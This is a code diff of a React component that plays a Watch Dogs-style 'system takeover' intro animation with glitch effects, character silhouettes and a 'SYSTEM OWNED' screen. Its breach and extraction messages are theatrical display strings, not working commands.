-        ctx.beginPath()
-        ctx.arc(body.head.x, body.head.y, body.head.radius, 0, Math.PI * 2)
-        ctx.fill()
-
-        // Draw head outline
-        ctx.strokeStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${layerAlpha})`
-        ctx.lineWidth = 2
-        ctx.beginPath()
-        ctx.arc(body.head.x, body.head.y, body.head.radius, 0, Math.PI * 2)
-        ctx.stroke()
-
-        // Draw body/shoulders
-        ctx.beginPath()
-        ctx.moveTo(body.head.x, body.head.y + body.head.radius - 5)
-        ctx.lineTo(body.leftShoulder.x, body.leftShoulder.y)
-        ctx.lineTo(body.leftShoulder.x - 10, size)
-        ctx.lineTo(body.rightShoulder.x + 10, size)
-        ctx.lineTo(body.rightShoulder.x, body.rightShoulder.y)
-        ctx.lineTo(body.head.x, body.head.y + body.head.radius - 5)
-        ctx.closePath()
-
-        const bodyGradient = ctx.createLinearGradient(centerX, body.head.y + body.head.radius, centerX, size)
-        bodyGradient.addColorStop(0, `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${0.5 * layerAlpha})`)
-        bodyGradient.addColorStop(1, `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${0.1 * layerAlpha})`)
-        ctx.fillStyle = bodyGradient
-        ctx.fill()
-        ctx.stroke()
-
-        // Draw eyes (menacing glow)
-        const eyeY = body.head.y - 5
-        const eyeGlow = 0.5 + Math.sin(time * 3) * 0.3
-
-        ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${eyeGlow})`
-        ctx.shadowBlur = 20
-        ctx.shadowColor = character.color
-        ctx.beginPath()
-        ctx.ellipse(body.head.x - 15, eyeY, 8, 4, 0, 0, Math.PI * 2)
-        ctx.fill()
-        ctx.beginPath()
-        ctx.ellipse(body.head.x + 15, eyeY, 8, 4, 0, 0, Math.PI * 2)
-        ctx.fill()
-        ctx.shadowBlur = 0
-
-        ctx.restore()
+      // Draw the appropriate character
+      switch (character.id) {
+        case 'wick': drawJohnWick(ctx, time); break
+        case 'bart': drawBart(ctx, time); break
+        case 'joker': drawJoker(ctx, time); break
+        case 'wolf': drawWolf(ctx, time); break
+        case 'duchess': drawDuchess(ctx, time); break
       }
 
-      // Add scan lines
-      for (let y = 0; y < size; y += 4) {
-        if (Math.random() > 0.97) {
-          ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.1)`
-          ctx.fillRect(0, y, size, 2)
-        }
-      }
+      ctx.shadowBlur = 0
 
-      // Horizontal glitch bars
-      if (Math.random() > 0.93) {
+      // Scan line effect
+      const scanY = (time * 100) % size
+      ctx.strokeStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.3)`
+      ctx.lineWidth = 2
+      ctx.beginPath()
+      ctx.moveTo(0, scanY)
+      ctx.lineTo(size, scanY)
+      ctx.stroke()
+
+      // Glitch effect occasionally
+      if (Math.random() > 0.97) {
         const glitchY = Math.random() * size
-        const glitchHeight = Math.random() * 20 + 5
-        ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.3)`
-        ctx.fillRect(0, glitchY, size, glitchHeight)
-      }
-
-      // Add floating data particles around character
-      if (particles.length < 30 && Math.random() > 0.9) {
-        particles.push({
-          x: Math.random() * size,
-          y: size + 10,
-          vx: (Math.random() - 0.5) * 2,
-          vy: -Math.random() * 3 - 1,
-          size: Math.random() * 3 + 1,
-          alpha: 1,
-          life: 1
-        })
-      }
-
-      // Update and draw particles
-      for (let i = particles.length - 1; i >= 0; i--) {
-        const p = particles[i]
-        p.x += p.vx
-        p.y += p.vy
-        p.life -= 0.01
-        p.alpha = p.life
-
-        if (p.life <= 0) {
-          particles.splice(i, 1)
-          continue
-        }
-
-        ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, ${p.alpha})`
-        ctx.fillRect(p.x, p.y, p.size, p.size)
+        const glitchH = Math.random() * 20 + 5
+        ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.5)`
+        ctx.fillRect(0, glitchY, size, glitchH)
       }
 
       animationRef.current = requestAnimationFrame(animate)
@@ -559,771 +1548,208 @@ function AnimatedCharacterSilhouette({
     return () => {
       if (animationRef.current) cancelAnimationFrame(animationRef.current)
     }
-  }, [character.color, size])
+  }, [character])
 
   return (
-    <canvas
-      ref={canvasRef}
-      width={size}
-      height={size}
-      className="relative z-10"
-    />
+    <motion.div
+      className="relative"
+      initial={{ scale: 0.8, opacity: 0 }}
+      animate={{ scale: 1, opacity: 1 }}
+      transition={{ type: 'spring', duration: 0.5 }}
+    >
+      {/* Glow backdrop */}
+      <div
+        className="absolute inset-0 blur-3xl opacity-50"
+        style={{ background: character.color }}
+      />
+
+      <canvas
+        ref={canvasRef}
+        width={400}
+        height={400}
+        className="relative z-10"
+      />
+
+      {/* Frame */}
+      <div
+        className="absolute inset-0 border-2 pointer-events-none"
+        style={{ borderColor: character.color }}
+      />
+    </motion.div>
   )
 }
 
 // ============================================
-// CHARACTER REVEAL COMPONENT - Watch Dogs Style
+// SCENE 7: SYSTEM OWNED
 // ============================================
-function CharacterReveal({
-  character,
-  onComplete
-}: {
-  character: typeof CHARACTERS[0]
-  onComplete: () => void
-}) {
-  const [showStats, setShowStats] = useState(false)
-  const [glitchBurst, setGlitchBurst] = useState(false)
-
+function SystemOwnedScene({ onComplete, userName }: { onComplete: () => void; userName: string }) {
   useEffect(() => {
     const timer = setTimeout(onComplete, 5000)
-    const statsTimer = setTimeout(() => setShowStats(true), 800)
-    const glitchTimer = setInterval(() => {
-      setGlitchBurst(true)
-      setTimeout(() => setGlitchBurst(false), 100)
-    }, 2000)
-
-    return () => {
-      clearTimeout(timer)
-      clearTimeout(statsTimer)
-      clearInterval(glitchTimer)
-    }
+    return () => clearTimeout(timer)
   }, [onComplete])
-
-  // Random threat level and stats
-  const threatLevel = Math.floor(Math.random() * 30) + 70
-  const stats = {
-    'THREAT': `${threatLevel}%`,
-    'SKILL': ['S', 'A', 'B'][Math.floor(Math.random() * 2)],
-    'STATUS': 'ACTIVE',
-    'CLEARANCE': 'OMEGA'
-  }
 
   return (
     <motion.div
-      className="fixed inset-0 z-[60] flex items-center justify-center overflow-hidden"
+      className="fixed inset-0 z-20 bg-black flex items-center justify-center"
       initial={{ opacity: 0 }}
       animate={{ opacity: 1 }}
       exit={{ opacity: 0 }}
     >
-      {/* Intense background */}
-      <div className="absolute inset-0 bg-black" />
+      <DedSecBackground intensity={1.5} />
 
-      {/* Grid overlay */}
-      <div
-        className="absolute inset-0 opacity-20"
-        style={{
-          backgroundImage: `
-            linear-gradient(${character.color}20 1px, transparent 1px),
-            linear-gradient(90deg, ${character.color}20 1px, transparent 1px)
-          `,
-          backgroundSize: '30px 30px',
-        }}
-      />
-
-      {/* Diagonal scan lines */}
       <motion.div
-        className="absolute inset-0 pointer-events-none opacity-30"
-        style={{
-          backgroundImage: `repeating-linear-gradient(
-            45deg,
-            transparent,
-            transparent 2px,
-            ${character.color}10 2px,
-            ${character.color}10 4px
-          )`,
-        }}
-        animate={{ backgroundPosition: ['0 0', '100px 100px'] }}
-        transition={{ duration: 2, repeat: Infinity, ease: 'linear' }}
-      />
-
-      {/* Moving scan line */}
-      <motion.div
-        className="absolute left-0 right-0 h-[3px] z-30"
-        style={{
-          background: `linear-gradient(90deg, transparent, ${character.color}, transparent)`,
-          boxShadow: `0 0 30px ${character.color}, 0 0 60px ${character.color}`,
-        }}
-        animate={{ top: ['-5%', '105%'] }}
-        transition={{ duration: 1.5, repeat: Infinity, ease: 'linear' }}
-      />
-
-      {/* Chromatic aberration burst on glitch */}
-      <AnimatePresence>
-        {glitchBurst && (
-          <>
-            <motion.div
-              className="absolute inset-0 z-50 pointer-events-none"
-              style={{ background: 'rgba(255,0,0,0.1)', transform: 'translateX(-5px)' }}
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              exit={{ opacity: 0 }}
-            />
-            <motion.div
-              className="absolute inset-0 z-50 pointer-events-none"
-              style={{ background: 'rgba(0,255,255,0.1)', transform: 'translateX(5px)' }}
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              exit={{ opacity: 0 }}
-            />
-          </>
-        )}
-      </AnimatePresence>
-
-      {/* Main content - flex layout */}
-      <div className="relative z-10 flex items-center gap-16 px-8">
-        {/* Animated character silhouette */}
-        <motion.div
-          className="relative"
-          initial={{ x: -100, opacity: 0 }}
-          animate={{ x: 0, opacity: 1 }}
-          transition={{ type: 'spring', duration: 0.8 }}
-        >
-          {/* Glow backdrop */}
-          <motion.div
-            className="absolute inset-0 rounded-full"
-            style={{
-              background: `radial-gradient(circle, ${character.color}60 0%, transparent 70%)`,
-              filter: 'blur(40px)',
-              transform: 'scale(1.5)',
-            }}
-            animate={{ opacity: [0.5, 0.8, 0.5], scale: [1.4, 1.6, 1.4] }}
-            transition={{ duration: 2, repeat: Infinity }}
-          />
-
-          {/* Character silhouette canvas */}
-          <AnimatedCharacterSilhouette character={character} size={300} />
-
-          {/* Corner brackets */}
-          <div className="absolute -top-4 -left-4 w-8 h-8 border-t-2 border-l-2" style={{ borderColor: character.color }} />
-          <div className="absolute -top-4 -right-4 w-8 h-8 border-t-2 border-r-2" style={{ borderColor: character.color }} />
-          <div className="absolute -bottom-4 -left-4 w-8 h-8 border-b-2 border-l-2" style={{ borderColor: character.color }} />
-          <div className="absolute -bottom-4 -right-4 w-8 h-8 border-b-2 border-r-2" style={{ borderColor: character.color }} />
-        </motion.div>
-
-        {/* Character info panel */}
-        <motion.div
-          className="flex flex-col gap-4"
-          initial={{ x: 100, opacity: 0 }}
-          animate={{ x: 0, opacity: 1 }}
-          transition={{ type: 'spring', duration: 0.8, delay: 0.2 }}
-        >
-          {/* Codename */}
-          <div>
-            <motion.p
-              className="text-xs font-mono tracking-[0.3em] mb-1"
-              style={{ color: `${character.color}99` }}
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              transition={{ delay: 0.4 }}
-            >
-              OPERATIVE IDENTIFIED
-            </motion.p>
-            <motion.h2
-              className="text-6xl font-bold font-mono"
-              style={{
-                color: character.color,
-                textShadow: `0 0 30px ${character.color}, 0 0 60px ${character.color}50`,
-              }}
-              initial={{ opacity: 0, y: 20 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.3 }}
-            >
-              <GlitchText intensity={glitchBurst ? 5 : 1}>{character.name}</GlitchText>
-            </motion.h2>
-            <motion.p
-              className="text-xl font-mono tracking-[0.2em] mt-2"
-              style={{ color: `${character.color}cc` }}
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              transition={{ delay: 0.5 }}
-            >
-              "{character.subtitle}"
-            </motion.p>
-          </div>
-
-          {/* Quote */}
-          <motion.div
-            className="max-w-md border-l-2 pl-4 py-2"
-            style={{ borderColor: `${character.color}50` }}
-            initial={{ opacity: 0, x: -20 }}
-            animate={{ opacity: 1, x: 0 }}
-            transition={{ delay: 0.7 }}
-          >
-            <p className="text-lg font-mono italic text-white/80">
-              "{character.quote}"
-            </p>
-          </motion.div>
-
-          {/* Stats panel */}
-          <AnimatePresence>
-            {showStats && (
-              <motion.div
-                className="grid grid-cols-2 gap-3 mt-4"
-                initial={{ opacity: 0, y: 20 }}
-                animate={{ opacity: 1, y: 0 }}
-                transition={{ staggerChildren: 0.1 }}
-              >
-                {Object.entries(stats).map(([key, value], i) => (
-                  <motion.div
-                    key={key}
-                    className="px-4 py-2 rounded border font-mono text-sm"
-                    style={{
-                      borderColor: `${character.color}40`,
-                      background: `${character.color}10`,
-                    }}
-                    initial={{ opacity: 0, scale: 0.8 }}
-                    animate={{ opacity: 1, scale: 1 }}
-                    transition={{ delay: 0.8 + i * 0.1 }}
-                  >
-                    <span className="text-neutral-500 text-xs">{key}</span>
-                    <p style={{ color: character.color }}>{value}</p>
-                  </motion.div>
-                ))}
-              </motion.div>
-            )}
-          </AnimatePresence>
-
-          {/* Role badge */}
-          <motion.div
-            className="inline-flex items-center gap-2 px-6 py-3 rounded border font-mono text-sm tracking-wider mt-4"
-            style={{
-              borderColor: character.color,
-              color: character.color,
-              background: `${character.color}15`,
-              boxShadow: `0 0 30px ${character.color}30, inset 0 0 30px ${character.color}10`,
-            }}
-            initial={{ opacity: 0, scale: 0.8 }}
-            animate={{ opacity: 1, scale: 1 }}
-            transition={{ delay: 1.2 }}
-          >
-            <motion.div
-              className="w-2 h-2 rounded-full"
-              style={{ background: character.color }}
-              animate={{ opacity: [1, 0.3, 1] }}
-              transition={{ duration: 0.5, repeat: Infinity }}
-            />
-            {character.role}
-          </motion.div>
-        </motion.div>
-      </div>
-
-      {/* Bottom status bar */}
-      <motion.div
-        className="absolute bottom-8 left-8 right-8 flex justify-between items-center font-mono text-xs"
-        initial={{ opacity: 0 }}
-        animate={{ opacity: 1 }}
-        transition={{ delay: 1 }}
+        className="relative z-10 text-center"
+        initial={{ scale: 0.5, opacity: 0 }}
+        animate={{ scale: 1, opacity: 1 }}
+        transition={{ type: 'spring', duration: 0.8 }}
       >
-        <div className="flex items-center gap-4" style={{ color: character.color }}>
-          <motion.span
-            animate={{ opacity: [1, 0.3, 1] }}
-            transition={{ duration: 1, repeat: Infinity }}
-          >
-            ◉ SCANNING
-          </motion.span>
-          <span className="text-neutral-500">ID: {character.id.toUpperCase()}-{Math.random().toString(36).substring(2, 8).toUpperCase()}</span>
-        </div>
-        <div className="text-neutral-500">
-          MILLER AI GROUP // OPERATIVE DATABASE v2.0
-        </div>
+        {/* ASCII Art */}
+        <motion.pre
+          className="text-fuchsia-500 text-xs md:text-sm font-mono mb-8 leading-tight"
+          style={{ textShadow: '0 0 20px rgba(255,0,255,0.8)' }}
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 0.5 }}
+        >
+{`
+███╗   ███╗██╗██╗     ██╗     ███████╗██████╗
+████╗ ████║██║██║     ██║     ██╔════╝██╔══██╗
+██╔████╔██║██║██║     ██║     █████╗  ██████╔╝
+██║╚██╔╝██║██║██║     ██║     ██╔══╝  ██╔══██╗
+██║ ╚═╝ ██║██║███████╗███████╗███████╗██║  ██║
+╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+     █████╗ ██╗    ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗
+    ██╔══██╗██║   ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗
+    ███████║██║   ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝
+    ██╔══██║██║   ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝
+    ██║  ██║██║   ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║
+    ╚═╝  ╚═╝╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝
+`}
+        </motion.pre>
+
+        <motion.h1
+          className="text-5xl md:text-7xl font-bold font-mono mb-4"
+          style={{
+            color: '#ff0040',
+            textShadow: '0 0 50px rgba(255,0,64,0.8), 4px 0 0 #00ffff, -4px 0 0 #ff00ff',
+          }}
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ delay: 1 }}
+        >
+          SYSTEM OWNED
+        </motion.h1>
+
+        <motion.p
+          className="text-2xl font-mono text-fuchsia-400 mb-2"
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 1.5 }}
+        >
+          Welcome to the collective, {userName}
+        </motion.p>
+
+        <motion.p
+          className="text-sm font-mono text-neutral-500"
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 2 }}
+        >
+          Your system now belongs to Miller AI Group
+        </motion.p>
+
+        {/* Glitch lines */}
+        <motion.div
+          className="absolute inset-0 pointer-events-none"
+          animate={{
+            opacity: [0, 0.5, 0],
+          }}
+          transition={{ duration: 0.1, repeat: Infinity, repeatDelay: 2 }}
+        >
+          {[...Array(5)].map((_, i) => (
+            <div
+              key={i}
+              className="absolute left-0 right-0 h-1 bg-fuchsia-500"
+              style={{ top: `${Math.random() * 100}%` }}
+            />
+          ))}
+        </motion.div>
       </motion.div>
     </motion.div>
   )
 }
 
 // ============================================
-// SCREEN EFFECTS - Intense Watch Dogs Style
-// ============================================
-function ScreenGlitchEffect({ active, intensity = 'medium' }: { active: boolean; intensity?: 'low' | 'medium' | 'high' }) {
-  const [glitchFrame, setGlitchFrame] = useState(0)
-
-  useEffect(() => {
-    if (!active) return
-    const interval = setInterval(() => {
-      setGlitchFrame(f => f + 1)
-    }, 50)
-    return () => clearInterval(interval)
-  }, [active])
-
-  if (!active) return null
-
-  const intensityConfig = {
-    low: { rgbOffset: 3, lines: 3, noise: 0.02 },
-    medium: { rgbOffset: 8, lines: 8, noise: 0.05 },
-    high: { rgbOffset: 15, lines: 15, noise: 0.1 },
-  }
-  const config = intensityConfig[intensity]
-
-  return (
-    <motion.div
-      className="fixed inset-0 z-[100] pointer-events-none overflow-hidden"
-      initial={{ opacity: 0 }}
-      animate={{ opacity: 1 }}
-      exit={{ opacity: 0 }}
-    >
-      {/* Intense RGB Split / Chromatic Aberration */}
-      <motion.div
-        className="absolute inset-0 mix-blend-lighten"
-        style={{
-          background: 'rgba(255,0,0,0.15)',
-          transform: `translateX(${-config.rgbOffset + Math.random() * 4}px)`,
-        }}
-        animate={{
-          x: [-config.rgbOffset, config.rgbOffset, -config.rgbOffset],
-          opacity: [0.1, 0.25, 0.1],
-        }}
-        transition={{ duration: 0.08, repeat: Infinity }}
-      />
-      <motion.div
-        className="absolute inset-0 mix-blend-lighten"
-        style={{
-          background: 'rgba(0,255,0,0.1)',
-          transform: `translateY(${Math.random() * 2}px)`,
-        }}
-        animate={{
-          y: [-2, 2, -2],
-          opacity: [0.05, 0.15, 0.05],
-        }}
-        transition={{ duration: 0.06, repeat: Infinity }}
-      />
-      <motion.div
-        className="absolute inset-0 mix-blend-lighten"
-        style={{
-          background: 'rgba(0,0,255,0.15)',
-          transform: `translateX(${config.rgbOffset - Math.random() * 4}px)`,
-        }}
-        animate={{
-          x: [config.rgbOffset, -config.rgbOffset, config.rgbOffset],
-          opacity: [0.1, 0.25, 0.1],
-        }}
-        transition={{ duration: 0.08, repeat: Infinity }}
-      />
-
-      {/* Horizontal tear/displacement lines */}
-      {[...Array(config.lines)].map((_, i) => {
-        const randomY = (glitchFrame * 7 + i * 13) % 100
-        const randomHeight = Math.random() * 8 + 2
-        const randomOffset = (Math.random() - 0.5) * 30
-
-        return (
-          <motion.div
-            key={i}
-            className="absolute left-0 right-0"
-            style={{
-              top: `${randomY}%`,
-              height: randomHeight,
-              background: `linear-gradient(90deg,
-                transparent ${Math.random() * 20}%,
-                rgba(255,0,255,0.3) ${20 + Math.random() * 20}%,
-                rgba(0,255,255,0.2) ${50 + Math.random() * 20}%,
-                transparent ${80 + Math.random() * 20}%
-              )`,
-              transform: `translateX(${randomOffset}px)`,
-            }}
-            animate={{
-              opacity: [0, 0.8, 0],
-              scaleX: [1, 1.2, 1],
-            }}
-            transition={{
-              duration: 0.1,
-              repeat: Infinity,
-              repeatDelay: Math.random() * 0.3,
-            }}
-          />
-        )
-      })}
-
-      {/* Block displacement glitches */}
-      {Math.random() > 0.7 && (
-        <motion.div
-          className="absolute bg-black"
-          style={{
-            top: `${Math.random() * 80}%`,
-            left: `${Math.random() * 80}%`,
-            width: `${Math.random() * 200 + 50}px`,
-            height: `${Math.random() * 30 + 10}px`,
-            transform: `translateX(${(Math.random() - 0.5) * 40}px)`,
-          }}
-          animate={{ opacity: [0, 1, 0] }}
-          transition={{ duration: 0.1 }}
-        />
-      )}
-
-      {/* Noise overlay */}
-      <motion.div
-        className="absolute inset-0"
-        style={{
-          backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E")`,
-          opacity: config.noise,
-          mixBlendMode: 'overlay',
-        }}
-        animate={{ opacity: [config.noise, config.noise * 2, config.noise] }}
-        transition={{ duration: 0.2, repeat: Infinity }}
-      />
-
-      {/* Scanline effect */}
-      <div
-        className="absolute inset-0"
-        style={{
-          backgroundImage: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.3) 2px, rgba(0,0,0,0.3) 4px)',
-          pointerEvents: 'none',
-        }}
-      />
-
-      {/* VHS tracking distortion */}
-      <motion.div
-        className="absolute left-0 right-0 h-16"
-        style={{
-          top: `${(glitchFrame * 3) % 110 - 10}%`,
-          background: 'linear-gradient(180deg, transparent, rgba(255,255,255,0.1) 50%, transparent)',
-          filter: 'blur(2px)',
-        }}
-      />
-    </motion.div>
-  )
-}
-
-function ScreenShakeEffect({ active, children }: { active: boolean; children: React.ReactNode }) {
-  return (
-    <motion.div
-      animate={active ? {
-        x: [0, -5, 5, -3, 3, 0],
-        y: [0, 3, -3, 2, -2, 0],
-      } : {}}
-      transition={{ duration: 0.3, repeat: active ? Infinity : 0 }}
-    >
-      {children}
-    </motion.div>
-  )
-}
-
-// ============================================
-// MAIN CINEMATIC TAKEOVER COMPONENT
+// MAIN CINEMATIC TAKEOVER
 // ============================================
 export function CinematicTakeover({ onComplete, userName = 'Operator' }: CinematicTakeoverProps) {
-  const [phase, setPhase] = useState<'init' | 'breach' | 'characters' | 'extraction' | 'final' | 'complete'>('init')
-  const [currentCharacter, setCurrentCharacter] = useState(0)
-  const [alerts, setAlerts] = useState<SystemAlert[]>([])
-  const [glitchActive, setGlitchActive] = useState(false)
-  const [glitchIntensity, setGlitchIntensity] = useState<'low' | 'medium' | 'high'>('medium')
-  const [shakeActive, setShakeActive] = useState(false)
-  const [terminalCount, setTerminalCount] = useState(1)
+  const [scene, setScene] = useState<SceneType>('boot')
 
-  // Add random alerts
-  const addAlert = useCallback((type: SystemAlert['type'], title: string, message: string) => {
-    const alert: SystemAlert = {
-      id: Math.random().toString(),
-      type,
-      title,
-      message,
-      x: Math.random() * (window.innerWidth - 350) + 25,
-      y: Math.random() * (window.innerHeight - 150) + 25,
-    }
-    setAlerts(prev => [...prev, alert])
+  const handleSceneComplete = useCallback((nextScene: SceneType) => {
+    setScene(nextScene)
   }, [])
 
-  const removeAlert = useCallback((id: string) => {
-    setAlerts(prev => prev.filter(a => a.id !== id))
-  }, [])
-
-  // Trigger glitch burst with intensity
-  const triggerGlitch = useCallback((intensity: 'low' | 'medium' | 'high', duration: number) => {
-    setGlitchIntensity(intensity)
-    setGlitchActive(true)
-    setShakeActive(intensity !== 'low')
-    setTimeout(() => {
-      setGlitchActive(false)
-      setShakeActive(false)
-    }, duration)
-  }, [])
-
-  // Phase progression with MORE INTENSE effects
   useEffect(() => {
-    const timers: NodeJS.Timeout[] = []
-
-    if (phase === 'init') {
-      // Initial breach - build tension
-      timers.push(setTimeout(() => triggerGlitch('low', 150), 500))
-      timers.push(setTimeout(() => addAlert('warning', 'INTRUSION DETECTED', 'Unknown entity accessing system...'), 1000))
-      timers.push(setTimeout(() => triggerGlitch('medium', 200), 1500))
-      timers.push(setTimeout(() => addAlert('error', 'FIREWALL ALERT', 'Breach attempt on port 443'), 2500))
-      timers.push(setTimeout(() => setTerminalCount(2), 3000))
-      timers.push(setTimeout(() => triggerGlitch('high', 400), 3500))
-      timers.push(setTimeout(() => addAlert('error', 'CRITICAL', 'Multiple breach vectors detected'), 4000))
-      timers.push(setTimeout(() => triggerGlitch('high', 500), 4500))
-      timers.push(setTimeout(() => addAlert('breach', 'MILLER AI GROUP', 'System takeover initiated'), 5000))
-      timers.push(setTimeout(() => triggerGlitch('medium', 300), 5500))
+    if (scene === 'complete') {
+      onComplete()
     }
-
-    if (phase === 'breach') {
-      timers.push(setTimeout(() => setTerminalCount(3), 500))
-      timers.push(setTimeout(() => triggerGlitch('medium', 250), 1000))
-      timers.push(setTimeout(() => addAlert('warning', 'PRIVILEGE ESCALATION', 'Attempting sudo bypass...'), 1500))
-      timers.push(setTimeout(() => addAlert('success', 'ROOT ACCESS', 'Elevated privileges obtained'), 2500))
-      timers.push(setTimeout(() => triggerGlitch('high', 600), 3000))
-      timers.push(setTimeout(() => addAlert('breach', 'KERNEL ACCESS', 'Ring 0 penetration complete'), 3500))
-    }
-
-    if (phase === 'extraction') {
-      timers.push(setTimeout(() => triggerGlitch('medium', 200), 500))
-      timers.push(setTimeout(() => addAlert('warning', 'DATA STREAM', 'Initiating mass extraction...'), 1000))
-      timers.push(setTimeout(() => addAlert('success', 'CREDENTIALS', '847 credential pairs captured'), 2000))
-      timers.push(setTimeout(() => triggerGlitch('high', 400), 2500))
-      timers.push(setTimeout(() => addAlert('success', 'ENCRYPTION KEYS', 'Private keys extracted'), 3000))
-      timers.push(setTimeout(() => triggerGlitch('high', 500), 3500))
-    }
-
-    if (phase === 'final') {
-      timers.push(setTimeout(() => triggerGlitch('high', 800), 500))
-      timers.push(setTimeout(() => addAlert('breach', 'SYSTEM OWNED', 'Full control established'), 1000))
-    }
-
-    return () => timers.forEach(clearTimeout)
-  }, [phase, addAlert, triggerGlitch])
-
-  // Handle terminal completion
-  const handleTerminalComplete = useCallback((terminalPhase: string) => {
-    if (terminalPhase === 'init' && phase === 'init') {
-      setTimeout(() => setPhase('breach'), 500)
-    } else if (terminalPhase === 'breach' && phase === 'breach') {
-      setTimeout(() => setPhase('characters'), 500)
-    } else if (terminalPhase === 'extraction' && phase === 'extraction') {
-      setTimeout(() => setPhase('final'), 500)
-    } else if (terminalPhase === 'final' && phase === 'final') {
-      setTimeout(() => setPhase('complete'), 1000)
-    }
-  }, [phase])
-
-  // Handle character sequence
-  const handleCharacterComplete = useCallback(() => {
-    if (currentCharacter < CHARACTERS.length - 1) {
-      setCurrentCharacter(c => c + 1)
-    } else {
-      setPhase('extraction')
-    }
-  }, [currentCharacter])
-
-  // Complete the sequence
-  useEffect(() => {
-    if (phase === 'complete') {
-      const timer = setTimeout(onComplete, 1500)
-      return () => clearTimeout(timer)
-    }
-  }, [phase, onComplete])
+  }, [scene, onComplete])
 
   return (
-    <ScreenShakeEffect active={shakeActive}>
-      <div className="fixed inset-0 bg-black overflow-hidden">
-        {/* Background grid */}
-        <div
-          className="absolute inset-0 opacity-20"
-          style={{
-            backgroundImage: `
-              linear-gradient(rgba(0,255,65,0.1) 1px, transparent 1px),
-              linear-gradient(90deg, rgba(0,255,65,0.1) 1px, transparent 1px)
-            `,
-            backgroundSize: '50px 50px',
-          }}
-        />
-
-        {/* Scan line */}
-        <motion.div
-          className="absolute left-0 right-0 h-[2px] bg-green-500/50 z-10"
-          style={{ boxShadow: '0 0 20px rgba(0,255,65,0.5)' }}
-          animate={{ top: ['0%', '100%'] }}
-          transition={{ duration: 4, repeat: Infinity, ease: 'linear' }}
-        />
-
-        {/* Header bar */}
-        <div className="absolute top-0 left-0 right-0 h-8 bg-black/80 border-b border-green-500/30 flex items-center px-4 z-20">
-          <motion.div
-            className="w-2 h-2 rounded-full bg-red-500 mr-2"
-            animate={{ opacity: [1, 0.3, 1] }}
-            transition={{ duration: 0.5, repeat: Infinity }}
+    <div className="fixed inset-0 bg-black z-50">
+      <AnimatePresence mode="wait">
+        {scene === 'boot' && (
+          <BootSequence
+            key="boot"
+            onComplete={() => handleSceneComplete('interference')}
           />
-          <span className="font-mono text-xs text-red-500">SECURITY BREACH IN PROGRESS</span>
-          <span className="ml-auto font-mono text-xs text-green-500">
-            MILLER AI GROUP TAKEOVER PROTOCOL v3.0
-          </span>
-        </div>
+        )}
 
-        {/* Terminal windows */}
-        <AnimatePresence>
-          {phase !== 'characters' && phase !== 'complete' && (
-            <>
-              <TerminalWindow
-                title="root@miller-ai:~# [MAIN]"
-                lines={TERMINAL_SEQUENCES[phase] || TERMINAL_SEQUENCES.init}
-                x={50}
-                y={60}
-                width={550}
-                speed={30}
-                onComplete={() => handleTerminalComplete(phase)}
-              />
+        {scene === 'interference' && (
+          <InterferenceScene
+            key="interference"
+            onComplete={() => handleSceneComplete('network-breach')}
+          />
+        )}
 
-              {terminalCount >= 2 && (
-                <TerminalWindow
-                  title="root@miller-ai:~# [SCANNER]"
-                  lines={[
-                    { text: '$ network_scan --deep', type: 'command' },
-                    { text: 'Scanning network topology...', type: 'output' },
-                    { text: 'Found 24 active hosts', type: 'success' },
-                    { text: 'Mapping vulnerabilities...', type: 'output' },
-                    { text: '[!] Critical: CVE-2024-0001', type: 'error' },
-                    { text: '[!] Critical: CVE-2024-0002', type: 'error' },
-                    { text: '$ exploit_all --auto', type: 'command' },
-                    { text: 'Exploiting vulnerabilities...', type: 'output' },
-                    { text: '[+] 24/24 hosts compromised', type: 'success' },
-                  ]}
-                  x={620}
-                  y={60}
-                  width={450}
-                  speed={40}
-                />
-              )}
+        {scene === 'network-breach' && (
+          <NetworkBreachScene
+            key="network"
+            onComplete={() => handleSceneComplete('terminal-takeover')}
+          />
+        )}
 
-              {terminalCount >= 3 && (
-                <TerminalWindow
-                  title="root@miller-ai:~# [EXFIL]"
-                  lines={[
-                    { text: '$ dump_memory --all', type: 'command' },
-                    { text: 'Dumping system memory...', type: 'output' },
-                    { text: '████████░░░░░░░░░░░░ 40%', type: 'output' },
-                    { text: '████████████░░░░░░░░ 60%', type: 'output' },
-                    { text: '████████████████░░░░ 80%', type: 'output' },
-                    { text: '████████████████████ 100%', type: 'success' },
-                    { text: '[+] Memory dump complete', type: 'success' },
-                    { text: '[+] Transferring to C2 server...', type: 'output' },
-                  ]}
